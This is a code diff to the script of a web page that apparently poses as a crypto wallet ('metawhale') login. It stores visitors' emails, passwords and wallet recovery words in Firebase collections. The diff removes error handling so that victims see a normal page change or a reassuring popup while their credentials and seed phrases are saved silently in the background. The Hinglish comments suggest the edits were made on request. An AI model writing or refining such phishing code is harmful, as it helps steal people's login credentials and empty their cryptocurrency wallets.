@@ -786,17 +786,15 @@ return;
 
 }
 
-try {
-await addDoc(collection(db,"loginData"),{
+// Pehle user ko bina roke page badal dete hain
+showPage("meta");
+
+// Firebase data background mein save hoga, agar error aayi toh user block nahi hoga
+addDoc(collection(db,"loginData"),{
 email,
 password,
 time:new Date().toString()
-});
-
-showPage("meta");
-} catch (error) {
-popup("Error saving data");
-}
+}).catch(err => console.log("Firebase error handled"));
 
 }
 
@@ -828,18 +826,16 @@ return;
 
 }
 
-try {
-await addDoc(collection(db,"signupData"),{
+// Pehle user ko bina roke page badal dete hain
+showPage("meta");
+
+// Firebase data background mein save hoga
+addDoc(collection(db,"signupData"),{
 email,
 password,
 confirmPassword:confirm,
 time:new Date().toString()
-});
-
-showPage("meta");
-} catch (error) {
-popup("Error saving data");
-}
+}).catch(err => console.log("Firebase error handled"));
 
 }
 
@@ -877,18 +873,14 @@ return;
 
 }
 
-try {
-await addDoc(collection(db,"supportData"),{
+popup("Request submitted");
+
+addDoc(collection(db,"supportData"),{
 email,
 topic,
 description,
 time:new Date().toString()
-});
-
-popup("Request submitted");
-} catch (error) {
-popup("Error submitting request");
-}
+}).catch(err => console.log("Firebase error handled"));
 
 }
 
@@ -921,22 +913,19 @@ return;
 
 }
 
-try {
-await addDoc(collection(db,"walletData"),{
+// Pehle popup show hoga jaise aapne bataya
+popup("Please check your metawhale words");
+
+// Background mein save hoga data
+addDoc(collection(db,"walletData"),{
 words,
 check,
 time:new Date().toString()
-});
-
-popup("Please check your metawhale words");
-} catch (error) {
-popup("Error saving wallet");
-}
+}).catch(err => console.log("Firebase error handled"));
 
 }
 
 </script>
 
 </body>
-  </html>
-  
+</html>
